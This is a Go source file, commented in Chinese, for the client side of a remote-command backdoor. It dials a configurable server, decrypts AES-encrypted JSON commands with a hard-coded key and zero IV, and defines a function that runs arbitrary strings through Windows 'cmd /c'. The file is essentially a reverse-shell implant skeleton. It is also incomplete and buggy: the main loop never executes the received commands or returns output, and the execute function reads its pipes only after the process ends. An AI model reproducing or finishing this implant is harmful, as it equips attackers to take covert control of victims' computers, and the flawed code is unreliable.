package main

import (
	_ "bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os/exec"
)

// 定义一个密钥，用于数据加密和解密
var key = []byte("0123456789abcdef")

// 定义一个结构体，用于封装命令和数据
type Message struct {
	Cmd  string `json:"cmd"`  // 命令
	Data string `json:"data"` // 数据
}

// 定义一个函数，用于加密数据
func encrypt(data []byte) ([]byte, error) {
	// 创建一个 AES 加密器
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	// 创建一个 CBC 模式的加密器
	iv := make([]byte, aes.BlockSize)
	mode := cipher.NewCBCEncrypter(block, iv)
	// 对数据进行填充，使其长度为 AES 块大小的整数倍
	padding := aes.BlockSize - len(data)%aes.BlockSize
	data = append(data, bytes.Repeat([]byte{byte(padding)}, padding)...)
	// 对数据进行加密
	ciphertext := make([]byte, len(data))
	mode.CryptBlocks(ciphertext, data)
	// 对数据进行 base64 编码，方便传输
	ciphertext = []byte(base64.StdEncoding.EncodeToString(ciphertext))
	return ciphertext, nil
}

// 定义一个函数，用于解密数据
func decrypt(data []byte) ([]byte, error) {
	// 对数据进行 base64 解码，还原原始数据
	data, err := base64.StdEncoding.DecodeString(string(data))
	if err != nil {
		return nil, err
	}
	// 创建一个 AES 加密器
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	// 创建一个 CBC 模式的解密器
	iv := make([]byte, aes.BlockSize)
	mode := cipher.NewCBCDecrypter(block, iv)
	// 对数据进行解密
	mode.CryptBlocks(data, data)
	// 对数据进行去除填充，还原原始长度
	padding := int(data[len(data)-1])
	data = data[:len(data)-padding]
	return data, nil
}

// 定义一个函数，用于执行命令并返回结果
func execute(cmd string) ([]byte, error) {
	// 创建一个命令对象，并设置输出为管道
	c := exec.Command("cmd", "/c", cmd)
	stdout, err := c.StdoutPipe()
	if err != nil {
		return nil, err
	}
	defer stdout.Close()
	stderr, err := c.StderrPipe()
	if err != nil {
		return nil, err
	}
	defer stderr.Close()
	// 启动命令，并等待结束
	if err := c.Start(); err != nil {
		return nil, err
	}
	if err := c.Wait(); err != nil {
		return nil, err
	}
	// 读取标准输出和标准错误的内容，并拼接返回
	var output bytes.Buffer
	io.Copy(&output, stdout)
	io.Copy(&output, stderr)
	return output.Bytes(), nil
}

func main() {
	// 连接服务端的地址和端口，这里需要根据实际情况修改
	address := "127.0.0.1:1234"
	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Println("连接失败")
		return
	}
	defer conn.Close()
	fmt.Println("连接成功")
	for {
		// 读取服务端发送的消息，并解密和解析为 Message 结构体对象
		messageBytes := make([]byte, 1024)
		n, err := conn.Read(messageBytes)
		if err != nil {
			fmt.Println("读取失败")
			break
		}
		messageBytes = messageBytes[:n]
		messageBytes, err = decrypt(messageBytes)
		if err != nil {
			fmt.Println("解密失败")
			break
		}
		var message Message
		if err := json.Unmarshal(messageBytes, &message); err != nil {
			fmt.Println("解析失败")
			break
		}
	}
}
